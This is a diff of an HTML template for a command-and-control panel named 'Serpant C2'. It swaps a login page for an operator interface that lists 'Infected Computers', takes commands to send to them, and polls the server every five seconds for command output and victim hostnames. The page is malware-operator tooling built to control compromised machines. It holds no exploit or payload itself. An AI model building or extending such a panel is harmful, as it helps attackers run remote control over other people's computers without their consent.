@@ -1,28 +1,60 @@
 <!DOCTYPE html>
 <html>
 <head>
-	<meta charset="utf-8">
-	<meta name="viewport" content="width=device-width, initial-scale=1">
-	<link rel="stylesheet" type="text/css" href="{{ url_for('static', filename='css/login.css') }}">
-	<title>Serpant C2</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Serpant C2</title>
+    <link rel="stylesheet" type="text/css" href="{{ url_for('static', filename='css/input.css') }}">
+
+    <script type="text/javascript">
+        function fetchOutput() {
+            fetch('/send_command')
+                .then(response => response.text())
+                .then(data => {
+                    document.getElementById('output').innerText = data;
+                })
+                .catch(error => console.log('Error:', error));
+        }
+
+        function fetchName() {
+            fetch('/hostname')
+                .then(response => response.text())
+                .then(data => {
+                    document.getElementById('compName').innerText = data;
+                })
+                .catch(error => console.log('Error: ', error));
+        }
+
+        setInterval(fetchOutput, 5000);
+        setInterval(fetchName, 5000);
+
+        window.onload = function() {
+            fetchOutput();
+            fetchName();
+        };
+
+    </script>
 </head>
 <body>
-	<div class="box">
-		<div class="left-side">
-			<h1>SerpantC2</h1>
-		</div>
-		<div class="right-side">
-			<form action="/login" method="POST">
-				<label for="username">Username:</label>
-				<input type="text" name="username">
-				<label for="password">Password:</label>
-				<input type="password" name="password">
-				<input type="submit" name="submit">
-				{% if error %}
-					<p style="color: red;">{{ error }}</p>
-				{% endif %}
-			</form>
-		</div>
-	</div>
+
+    <div class="sidebar">
+        <h1 style="padding-left: 50px;">Infected Computers</h1>
+        <p style="color: white; padding: 10px; font-family: Lucida Console;" id="compName"></p>
+        <hr style="border: none; border-top: 1px solid grey;">
+    </div>
+
+    <div class="content">
+        <div class="form-container">
+            <form action="{{ url_for('update_command') }}" method="POST">
+                <label for="command">Enter A Command:</label>
+                <input type="text" name="command" id="command" class="command-input">
+                <input type="submit" value="Send Command">
+            </form>
+        </div>
+        <div class="output-text">
+            <h1 id="output">Output: </h1>
+        </div>
+    </div>
+
 </body>
 </html>
